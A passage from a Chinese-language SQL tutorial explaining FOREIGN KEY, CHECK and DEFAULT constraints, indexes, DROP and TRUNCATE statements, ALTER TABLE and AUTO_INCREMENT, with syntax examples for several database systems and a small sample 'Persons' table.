<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> fk_PerOrders <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>当 “Orders” 表已被创建时，如需在 “P_Id” 列创建 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>撤销 FOREIGN KEY 约束</p>
<p>如需撤销 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CHECK-约束"><a href="#SQL-CHECK-约束" class="headerlink" title="SQL CHECK 约束"></a>SQL CHECK 约束</h4><p>CHECK 约束用于限制列中的值的范围。</p>
<p>如果对单个列定义 CHECK 约束，那么该列只允许特定的值。</p>
<p>如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。</p>
<p>CREATE TABLE 时的 SQL CHECK 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 CHECK 约束。CHECK 约束规定 “P_Id” 列必须只包含大于 0 的整数。</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CHECK (P_Id&gt;0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> CHECK (P_Id&gt;0),</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT chk_Person CHECK (P_Id&gt;0 <span class="keyword">AND</span> <span class="attribute">City</span>=<span class="string">'Sandnes'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL CHECK 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> chk_Person <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span> <span class="keyword">AND</span> City=<span class="string">'Sandnes'</span>)</span><br></pre></td></tr></table></figure>

<p>撤销 CHECK 约束</p>
<p>如需撤销 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> chk_Person</span><br></pre></td></tr></table></figure>

<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CHECK</span> chk_Person</span><br></pre></td></tr></table></figure>

<h4 id="SQL-DEFAULT-约束"><a href="#SQL-DEFAULT-约束" class="headerlink" title="SQL DEFAULT 约束"></a>SQL DEFAULT 约束</h4><p>DEFAULT 约束用于向列中插入默认值。</p>
<p>如果没有规定其他的值，那么会将默认值添加到所有的新记录。</p>
<p>CREATE TABLE 时的 SQL DEFAULT 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束：</p>
<p><strong>My SQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    P_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="string">'Sandnes'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">    O_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    OrderNo int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    P_Id int,</span><br><span class="line">    OrderDate date<span class="built_in"> DEFAULT </span>GETDATE()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL DEFAULT 约束</p>
<p>当表已被创建时，如需在 “City” 列创建 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> ab_c <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span> <span class="keyword">for</span> City</span><br></pre></td></tr></table></figure>

<p><strong>Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">MODIFY</span> City <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p>撤销 DEFAULT 约束</p>
<p>如需撤销 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-INDEX-语句"><a href="#SQL-CREATE-INDEX-语句" class="headerlink" title="SQL CREATE INDEX 语句"></a>SQL CREATE INDEX 语句</h4><p>CREATE INDEX 语句用于在表中创建索引。</p>
<p>在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</p>
<p>索引</p>
<p>您可以在表中创建索引，以便更加快速高效地查询数据。</p>
<p>用户无法看到索引，它们只能被用来加速搜索/查询。</p>
<p><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p>
<p>SQL CREATE INDEX 语法</p>
<p>在表上创建一个简单的索引。允许使用重复的值：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p>SQL CREATE UNIQUE INDEX 语法</p>
<p>在表上创建一个唯一的索引。不允许使用重复的值：唯一的索引意味着两个行不能拥有相同的索引值。Creates a unique index on a table. Duplicate values are not allowed:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>用于创建索引的语法在不同的数据库中不一样。因此，检查您的数据库中创建索引的语法。</p>
<p>CREATE INDEX 实例</p>
<p>下面的 SQL 语句在 “Persons” 表的 “LastName” 列上创建一个名为 “PIndex” 的索引：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName)</span><br></pre></td></tr></table></figure>

<p>如果您希望索引不止一个列，您可以在括号中列出这些列的名称，用逗号隔开：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName, FirstName)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-撤销索引、撤销表以及撤销数据库"><a href="#SQL-撤销索引、撤销表以及撤销数据库" class="headerlink" title="SQL 撤销索引、撤销表以及撤销数据库"></a>SQL 撤销索引、撤销表以及撤销数据库</h4><hr>
<p>通过使用 DROP 语句，可以轻松地删除索引、表和数据库。</p>
<hr>
<p>DROP INDEX 语句</p>
<p>DROP INDEX 语句用于删除表中的索引。</p>
<p>用于 MS Access 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name <span class="keyword">ON</span> table_name</span><br></pre></td></tr></table></figure>

<p>用于 MS SQL Server 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> table_name.index_name</span><br></pre></td></tr></table></figure>

<p>用于 DB2/Oracle 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>用于 MySQL 的 DROP INDEX 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>DROP TABLE 语句</p>
<p>DROP TABLE 语句用于删除表。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<p>DROP DATABASE 语句</p>
<p>DROP DATABASE 语句用于删除数据库。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> database_name</span><br></pre></td></tr></table></figure>

<p>TRUNCATE TABLE 语句</p>
<p>如果我们仅仅需要删除表内的数据，但并不删除表本身，那么我们该如何做呢？</p>
<p>请使用 TRUNCATE TABLE 语句：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCATE <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ALTER-TABLE-语句"><a href="#SQL-ALTER-TABLE-语句" class="headerlink" title="SQL ALTER TABLE 语句"></a>SQL ALTER TABLE 语句</h4><hr>
<p>ALTER TABLE 语句</p>
<p>ALTER TABLE 语句用于在已有的表中添加、删除或修改列。</p>
<p>SQL ALTER TABLE 语法</p>
<p>如需在表中添加列，请使用下面的语法:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name</span><br></pre></td></tr></table></figure>

<p>要改变表中列的数据类型，请使用下面的语法：</p>
<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p><strong>My SQL / Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>Oracle 10G 之后版本:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<hr>
<p>SQL ALTER TABLE 实例</p>
<p>请看 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>现在，我们想在 “Persons” 表中添加一个名为 “DateOfBirth” 的列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> DateOfBirth <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<p>请注意，新列 “DateOfBirth” 的类型是 date，可以存放日期。数据类型规定列中可以存放的数据的类型。如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
<th align="left">DateOfBirth</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
<td align="left"></td>
</tr>
</tbody></table>
<hr>
<p>改变数据类型实例</p>
<p>现在，我们想要改变 “Persons” 表中 “DateOfBirth” 列的数据类型。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> DateOfBirth <span class="keyword">year</span></span><br></pre></td></tr></table></figure>

<p>请注意，现在 “DateOfBirth” 列的类型是 year，可以存放 2 位或 4 位格式的年份。</p>
<hr>
<p>DROP COLUMN 实例</p>
<p>接下来，我们想要删除 “Person” 表中的 “DateOfBirth” 列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> DateOfBirth</span><br></pre></td></tr></table></figure>

<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<h4 id="AUTO-INCREMENT-字段"><a href="#AUTO-INCREMENT-字段" class="headerlink" title="AUTO INCREMENT 字段"></a>AUTO INCREMENT 字段</h4><p>我们通常希望在每次插入新记录时，自动地创建主键字段的值。</p>
<p>我们可以在表中创建一个 auto-increment 字段。</p>
<hr>
<p>用于 MySQL 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (ID)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MySQL 使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER <span class="keyword">TABLE</span> Persons <span class="comment">AUTO_INCREMENT=100</span></span><br></pre></td></tr></table></figure>

<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 SQL Server 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int IDENTITY(1,1) PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS SQL Server 使用 <strong>IDENTITY</strong> 关键字来执行 auto-increment 任务。</p>
<p>在上面的实例中，<strong>IDENTITY 的开始值是 1，每条新记录递增 1。</strong></p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 identity 改为 IDENTITY(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Access 的语法</p>
